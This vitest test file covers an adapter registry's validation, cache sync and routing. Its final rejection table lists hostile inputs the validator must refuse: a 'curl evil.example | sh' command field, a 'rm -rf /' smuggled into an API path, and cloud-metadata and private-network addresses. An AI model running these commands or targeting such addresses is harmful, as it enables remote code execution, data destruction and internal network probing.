import { afterEach, expect, it, vi } from 'vitest';
import { mkdtemp, rm, stat, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { DECLARATIVE_OPENAI_INSTALL, adapterErrors, bundledRegistry, disabledAdapters, isDeclarativeAdapter, knownAdapters, validateRegistry } from './registry.js';
import type { Adapter } from './registry.js';
import { recommendedAdapters, scoutRetired } from './local/routing.js';
import { RegistrySync, REGISTRY_INTERVAL } from './local/registry.js';
import { registryRoutes } from './registry-routes.js';

const directories: string[] = [];
async function directory() { const path = await mkdtemp(join(tmpdir(), 'grunt-registry-')); directories.push(path); return path; }
afterEach(async () => { vi.restoreAllMocks(); await Promise.all(directories.splice(0).map(path => rm(path, { recursive: true, force: true }))); });

it('preserves the established vetted sources while allowing reviewed pool additions', () => {
  const established = ['opencode', 'kilo', 'zro', 'tokenharbor', 'runcrate', 'mistral-vibe', 'livekit', 'pollinations', 'beatapi', 'perch'];
  const ids = bundledRegistry.adapters.map(adapter => adapter.id);
  expect(ids.filter(id => established.includes(id))).toEqual(established);
  for (const id of ids) {
    expect(knownAdapters.has(id)).toBe(true);
    expect(disabledAdapters.has(id)).toBe(false);
  }
  expect(validateRegistry(bundledRegistry)).toEqual(bundledRegistry);
  expect(bundledRegistry.adapters.some(a => /cloudflare|qwen|freebuff|apinex/.test(a.id))).toBe(false);
  expect(bundledRegistry.adapters.filter(a => a.tier === 'stable').map(a => a.id)).toEqual(['opencode', 'kilo', 'zro']);
  const experimental = bundledRegistry.adapters.filter(a => a.tier === 'experimental');
  expect(experimental.length).toBeGreaterThanOrEqual(established.length - 3);
  for (const adapter of experimental) expect(adapter.weight).toBeCloseTo(0.2 / experimental.length, 12);
  expect(bundledRegistry.adapters.filter(a => a.tier === 'stable').reduce((sum, a) => sum + a.weight, 0)).toBeCloseTo(0.8);
  expect(bundledRegistry.adapters.filter(a => a.tier === 'experimental').reduce((sum, a) => sum + a.weight, 0)).toBeCloseTo(0.2);
  expect(() => validateRegistry({ ...bundledRegistry, adapters: bundledRegistry.adapters.map(a => a.id === 'tokenharbor' ? { ...a, weight: 0.3 } : a) })).toThrow();
});
it.each([
  { version: 2 }, { published: 'invalid' }, { adapters: [] },
  { adapters: [{ ...bundledRegistry.adapters[0], weight: -1 }] },
  { adapters: [{ ...bundledRegistry.adapters[0], modalities: ['video'] }] },
  { adapters: [bundledRegistry.adapters[0], bundledRegistry.adapters[0]] }
])('rejects invalid registries: %j', invalid => { expect(() => validateRegistry({ ...bundledRegistry, ...invalid })).toThrow(); });

it('validates OpenCode model pools without ambiguous scalar settings', () => {
  const opencode = bundledRegistry.adapters.find(adapter => adapter.id === 'opencode')!;
  expect(opencode.models).toEqual(['deepseek-v4.1-flash-free', 'glm-5.3-flash-free', 'big-pickle']);
  for (const invalid of [[], [''], ['big-pickle', 'big-pickle'], [123], ['valid', null]]) {
    expect(() => validateRegistry({ ...bundledRegistry, adapters: [{ ...opencode, models: invalid }] })).toThrow();
  }
  expect(() => validateRegistry({ ...bundledRegistry, adapters: [{ ...opencode, model: 'big-pickle' }] })).toThrow();
  expect(() => validateRegistry({ ...bundledRegistry, adapters: [{ ...bundledRegistry.adapters.find(adapter => adapter.id === 'kilo')!, models: ['big-pickle'] }] })).toThrow();
});

it('publishes the anonymous Reflection route as an ordinary curated source', () => {
  expect(knownAdapters.has('reflection-beam')).toBe(true);
  expect(bundledRegistry.adapters.find(adapter => adapter.id === 'reflection-beam')).toMatchObject({
    kind: 'model', install: 'builtin:reflection-beam', model: 'reflection/beam-free', modalities: ['text']
  });
});

it('supports explicit Antseed setup while withholding automatic enrollment until context qualifies', () => {
  expect(knownAdapters.has('antseed-vikey')).toBe(true);
  expect(bundledRegistry.adapters.some(adapter => adapter.id === 'antseed-vikey')).toBe(false);
});

it('gateway down keeps cached list and persists private cache', async () => {
  const path = await directory();
  const updated = { ...bundledRegistry, published: new Date(Date.parse(bundledRegistry.published) + 1000).toISOString(), adapters: [bundledRegistry.adapters[1]] };
  const fetcher = vi.fn<typeof fetch>().mockResolvedValueOnce(Response.json(updated, { headers: { ETag: '"published"' } })).mockRejectedValue(new Error('offline'));
  const sync = new RegistrySync({ directory: path, fetcher });
  await sync.load(); await sync.sync();
  expect(sync.current).toEqual(updated);
  expect((await stat(join(path, 'registry.json'))).mode & 0o777).toBe(0o600);
  await sync.sync(); expect(sync.current).toEqual(updated);
  const restarted = new RegistrySync({ directory: path, fetcher });
  await restarted.load(); await restarted.sync(); expect(restarted.current).toEqual(updated);
  expect(fetcher.mock.calls[1]![1]?.headers).toMatchObject({ 'If-None-Match': '"published"' });
});
it('syncs at startup and every six hours from UTC midnight, and stops syncing on close', async () => {
  vi.useFakeTimers(); vi.setSystemTime(new Date('2026-11-15T22:00:00Z'));
  const fetcher = vi.fn<typeof fetch>(async () => new Response(null, { status: 304 }));
  const sync = new RegistrySync({ directory: await directory(), fetcher });
  try {
    await sync.start(); expect(fetcher).toHaveBeenCalledOnce();
    await vi.advanceTimersByTimeAsync(2 * 60 * 60 * 1000 - 1); expect(fetcher).toHaveBeenCalledOnce();
    await vi.advanceTimersByTimeAsync(1); expect(fetcher).toHaveBeenCalledTimes(2);
    await vi.advanceTimersByTimeAsync(REGISTRY_INTERVAL); expect(fetcher).toHaveBeenCalledTimes(3);
    await sync.close(); await vi.advanceTimersByTimeAsync(REGISTRY_INTERVAL); expect(fetcher).toHaveBeenCalledTimes(3);
  } finally { await sync.close(); vi.useRealTimers(); }
});
it('keeps the route loop scheduled when a route pass fails to start', async () => {
  vi.useFakeTimers(); vi.setSystemTime(new Date('2026-11-15T23:00:00Z'));
  const notify = vi.fn(), synced = vi.fn().mockReturnValueOnce(undefined).mockImplementationOnce(() => { throw new Error('pass failed'); }).mockReturnValue(undefined);
  const fetcher = vi.fn<typeof fetch>(async () => new Response(null, { status: 304 }));
  const sync = new RegistrySync({ directory: await directory(), fetcher, synced, notify });
  try {
    await sync.start();
    await vi.advanceTimersByTimeAsync(3600000); expect(fetcher).toHaveBeenCalledTimes(2);
    expect(notify).toHaveBeenCalledWith('Background setup incomplete; run usegrunt setup to resume');
    await vi.advanceTimersByTimeAsync(REGISTRY_INTERVAL); expect(fetcher).toHaveBeenCalledTimes(3);
  } finally { await sync.close(); vi.useRealTimers(); }
});

it.each([new Response('bad json'), Response.json({ version: 9 }), new Response(null, { status: 503 }), new Response(null, { status: 304 })])('retains the bundled list on invalid or unavailable responses', async response => {
  const sync = new RegistrySync({ directory: await directory(), fetcher: async () => response });
  await sync.load(); await sync.sync(); expect(sync.current).toEqual(bundledRegistry);
});
it('ignores unknown adapter code and starts a route pass after every sync, changed or not', async () => {
  const synced = vi.fn();
  const unknown = { ...bundledRegistry.adapters.find(adapter => adapter.id === 'kilo')!, id: 'unknown', install: 'npm:unknown' };
  const fetcher = vi.fn<typeof fetch>().mockResolvedValueOnce(Response.json({ ...bundledRegistry, published: new Date(Date.parse(bundledRegistry.published) + 1000).toISOString(), adapters: [bundledRegistry.adapters[0], unknown] }, { headers: { ETag: '"first"' } }))
    .mockResolvedValueOnce(new Response(null, { status: 304 }))
    .mockResolvedValueOnce(Response.json({ ...bundledRegistry, published: new Date(Date.parse(bundledRegistry.published) + 2000).toISOString(), adapters: [bundledRegistry.adapters[1]] }));
  const sync = new RegistrySync({ directory: await directory(), fetcher, synced });
  await sync.load(); await sync.sync(); await sync.sync();
  expect(synced).toHaveBeenCalledTimes(2);
  expect(sync.enabled.map(adapter => adapter.id)).toEqual(['opencode']);
  await sync.sync(); expect(sync.enabled.map(adapter => adapter.id)).toEqual(['kilo']);
});
it('serves persisted registry data with conditional requests', async () => {
  const path = join(await directory(), 'published.json');
  const app = registryRoutes(path);
  expect((await app.request('/v1/registry')).status).toBe(503);
  await writeFile(path, JSON.stringify(bundledRegistry));
  const response = await app.request('/v1/registry');
  expect(response.status).toBe(200); expect(await response.json()).toEqual(bundledRegistry);
  const etag = response.headers.get('etag')!;
  expect((await app.request('/v1/registry', { headers: { 'If-None-Match': etag } })).status).toBe(304);
  await writeFile(path, JSON.stringify({ ...bundledRegistry, published: '2026-11-12T00:00:00Z' }));
  expect((await app.request('/v1/registry', { headers: { 'If-None-Match': etag } })).status).toBe(200);
  await writeFile(path, 'bad'); expect((await app.request('/v1/registry')).status).toBe(503);
});

it('reaches the published Fly registry if the custom domain fails', async () => {
  const fetcher = vi.fn<typeof fetch>().mockRejectedValueOnce(new Error('DNS unavailable')).mockResolvedValueOnce(Response.json(bundledRegistry));
  const sync = new RegistrySync({ directory: await directory(), fetcher });
  await sync.sync();
  expect(fetcher.mock.calls.map(([url]) => url)).toEqual(['https://api.grunt.run/v1/registry', 'https://milo-gateway.fly.dev/v1/registry']);
  expect(sync.current).toEqual(bundledRegistry);
});
it('never sends an explicit registry override to another host', async () => {
  const fetcher = vi.fn<typeof fetch>().mockRejectedValue(new Error('offline'));
  const sync = new RegistrySync({ directory: await directory(), url: 'https://custom.test/v1/registry', fetcher });
  await sync.sync();
  expect(fetcher).toHaveBeenCalledOnce();
  expect(fetcher.mock.calls[0]![0]).toBe('https://custom.test/v1/registry');
});

it('accepts the scout fields and ranks great before possible before weight, never poor or retired', () => {
  const base = bundledRegistry.adapters.find(adapter => adapter.id === 'zro')!;
  const at = (id: string, extra: Record<string, unknown>) => ({ ...bundledRegistry.adapters.find(adapter => adapter.id === id)!, ...extra });
  const registry = validateRegistry({ ...bundledRegistry, adapters: bundledRegistry.adapters.map(adapter =>
    adapter.id === 'tokenharbor' ? at('tokenharbor', { fit: 'great', status: 'active', expires: '2027-01-31' })
      : adapter.id === 'runcrate' ? at('runcrate', { fit: 'poor' })
        : adapter.id === 'kilo' ? at('kilo', { status: 'expiring' })
          : adapter.id === 'beatapi' ? at('beatapi', { status: 'inactive' }) : adapter) });
  const ranked = recommendedAdapters(registry, Date.parse('2026-11-20T00:00:00Z')).map(adapter => adapter.id);
  expect(ranked[0]).toBe('tokenharbor');
  // Unrated routes count as possible and follow by weight; Kilo is expiring.
  expect(ranked.slice(1, 3)).toEqual(['opencode', 'zro']);
  expect(ranked).not.toContain('runcrate');
  expect(ranked).not.toContain('kilo');
  expect(ranked).not.toContain('beatapi');
  expect(scoutRetired({ ...base, expires: '2026-11-19' }, Date.parse('2026-11-19T23:59:59Z'))).toBe(false);
  expect(scoutRetired({ ...base, expires: '2026-11-19' }, Date.parse('2026-11-20T00:00:00Z'))).toBe(true);
  for (const bad of [{ fit: 'ok' }, { status: 'soon' }, { expires: '19 Nov' }, { expires: 20261119 }]) {
    expect(() => validateRegistry({ ...bundledRegistry, adapters: [{ ...base, ...bad }] })).toThrow('Invalid adapter registry');
  }
});

it.each([{ fit: ['poor'] }, { status: ['inactive'] }, { fit: {} }, { status: 1 }])('rejects non-string scout enums: %j', fields => {
  const registry = structuredClone(bundledRegistry);
  Object.assign(registry.adapters[0]!, fields);
  expect(() => validateRegistry(registry)).toThrow('Invalid adapter registry');
});


const validCandidate = { id: 'newco', signup: 'https://newco.example/signup', hints: 'Press Sign up.' };
it.each([
  {}, null, undefined, 'invalid', 1, [null],
  [{ ...validCandidate, id: 'Invalid ID' }],
  [{ ...validCandidate, signup: 'http://newco.example/' }],
  [{ ...validCandidate, hints: '' }],
  [{ ...validCandidate, hints: undefined }],
  [{ ...validCandidate, name: 7 }],
  [{ ...validCandidate, models: ['duplicate', 'duplicate'] }],
  [{ ...validCandidate, docs: 'not a URL' }],
  [{ ...validCandidate, notes: 'x'.repeat(501) }],
  [{ ...validCandidate, unexpected: true }],
  [validCandidate, validCandidate],
  [{ ...validCandidate, id: 'kilo' }],
  Array.from({ length: 101 }, (_, i) => ({ ...validCandidate, id: `candidate-${i}` }))
].map(candidates => ({ candidates })))('rejects a registry with invalid candidates: %#', ({ candidates }) => {
  expect(() => validateRegistry({ ...bundledRegistry, candidates })).toThrow('Invalid adapter registry');
});

it('accepts absent, empty and 100 valid candidates without changing their fields', () => {
  const { candidates: _candidates, ...withoutCandidates } = bundledRegistry;
  expect(validateRegistry(withoutCandidates)).toEqual(withoutCandidates);
  expect(validateRegistry({ ...withoutCandidates, candidates: [] }).candidates).toEqual([]);
  const candidates = Array.from({ length: 100 }, (_, i) => ({ ...validCandidate, id: `candidate-${i}`,
    name: 'New provider', models: ['free-model'], docs: 'https://newco.example/docs', notes: 'Free tier.' }));
  expect(validateRegistry({ ...withoutCandidates, candidates }).candidates).toEqual(candidates);
});

const validDeclarative: Adapter = {
  id: 'promo-free',
  kind: 'model',
  tier: 'experimental',
  weight: 0.01,
  modalities: ['text'],
  install: DECLARATIVE_OPENAI_INSTALL,
  model: 'deepseek-v4.1-flash:free',
  signup: 'https://promo.example/signup',
  hints: "On /signup press 'Continue with Google', then on /keys create key named grunt and press 'Copy'.",
  expires: '2026-12-31',
  declarative: {
    baseUrl: 'https://api.promo.example',
    apiPath: '/v1/chat/completions',
    modelsEndpoint: '/v1/models',
    zeroPriceCheck: 'models_catalog',
    disclosure: 'Prompts pass through Promo API and its upstream host. Retention and training are unverified.',
    policyVersion: '2026-11-25',
    policyUrl: 'https://promo.example/privacy',
    name: 'Promo Free',
    minContextLength: 65536
  }
};

it('accepts valid declarative OpenAI-compatible adapters and exposes them via RegistrySync.enabled', async () => {
  expect(adapterErrors(validDeclarative)).toEqual([]);
  expect(isDeclarativeAdapter(validDeclarative)).toBe(true);
  const noneCheck: Adapter = {
    ...validDeclarative,
    id: 'promo-none',
    declarative: {
      baseUrl: 'https://api.promo-none.example',
      apiPath: '/openai/v1/chat/completions',
      zeroPriceCheck: 'none',
      stream: true,
      disclosure: 'Prompts pass through Promo None.',
      policyVersion: '2026-11-25-v1',
      policyUrl: 'https://promo-none.example/privacy'
    }
  };
  expect(adapterErrors(noneCheck)).toEqual([]);
  const updated = validateRegistry({
    ...bundledRegistry,
    published: new Date(Date.parse(bundledRegistry.published) + 1000).toISOString(),
    adapters: [{ ...bundledRegistry.adapters[0]!, weight: 0.8 }, { ...validDeclarative, weight: 0.2 }]
  });
  const sync = new RegistrySync({ directory: await directory(), fetcher: async () => Response.json(updated) });
  await sync.load();
  await sync.sync();
  expect(sync.enabled.map(adapter => adapter.id)).toEqual(['opencode', 'promo-free']);
});

it.each([
  ['http baseUrl', { declarative: { ...validDeclarative.declarative!, baseUrl: 'http://api.promo.example' } }],
  ['loopback IPv4', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://127.0.0.1' } }],
  ['loopback IPv6', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://[::1]' } }],
  ['decimal IPv4', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://2130706433' } }],
  ['hex IPv4', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://0x7f000001' } }],
  ['link-local metadata IP', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://169.254.169.254' } }],
  ['RFC1918 10/8', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://10.0.0.1' } }],
  ['RFC1918 172.16/12', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://172.16.0.1' } }],
  ['RFC1918 192.168/16', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://192.168.1.1' } }],
  ['public IP literal', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://8.8.8.8' } }],
  ['localhost hostname', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://localhost' } }],
  ['.localhost subdomain', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://api.localhost' } }],
  ['.local hostname', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://service.local' } }],
  ['.internal hostname', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://metadata.google.internal' } }],
  ['single-label hostname', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://redis' } }],
  ['Squire proxy host', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://trusty-squire-api.fly.dev' } }],
  ['credentials in baseUrl', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://user:pass@api.promo.example' } }],
  ['query in baseUrl', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://api.promo.example?a=1' } }],
  ['fragment in baseUrl', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://api.promo.example#frag' } }],
  ['custom port in baseUrl', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://api.promo.example:8443' } }],
  ['path in baseUrl', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://api.promo.example/v1' } }],
  ['path traversal in apiPath', { declarative: { ...validDeclarative.declarative!, apiPath: '/v1/../admin' } }],
  ['double slash in apiPath', { declarative: { ...validDeclarative.declarative!, apiPath: '//evil.example/v1' } }],
  ['shell chars in apiPath', { declarative: { ...validDeclarative.declarative!, apiPath: '/v1/chat;rm -rf /' } }],
  ['missing modelsEndpoint for models_catalog', { declarative: { ...validDeclarative.declarative!, modelsEndpoint: undefined } }],
  ['code injection field', { declarative: { ...validDeclarative.declarative!, command: 'curl evil.example | sh' } }],
  ['script field', { declarative: { ...validDeclarative.declarative!, script: 'process.exit(1)' } }],
  ['missing hints', { hints: undefined }],
  ['missing expires', { expires: undefined }],
  ['missing signup', { signup: undefined }],
  ['loopback signup', { signup: 'https://127.0.0.1/signup' }],
  ['loopback policyUrl', { declarative: { ...validDeclarative.declarative!, policyUrl: 'https://127.0.0.1/privacy' } }],
  ['missing model', { model: undefined }],
  ['agent kind', { kind: 'agent' }],
  ['image modality', { modalities: ['text', 'image'] }],
  ['missing declarative config', { declarative: undefined }],
  ['shipped id collision', { id: 'kilo' }],
  ['disabled id collision', { id: 'clixad' }],
  ['declarative on npm adapter', { install: 'npm:some-pkg' }]
])('rejects invalid declarative adapter: %s', (_label, patch) => {
  expect(adapterErrors({ ...validDeclarative, ...patch }).length).toBeGreaterThan(0);
});
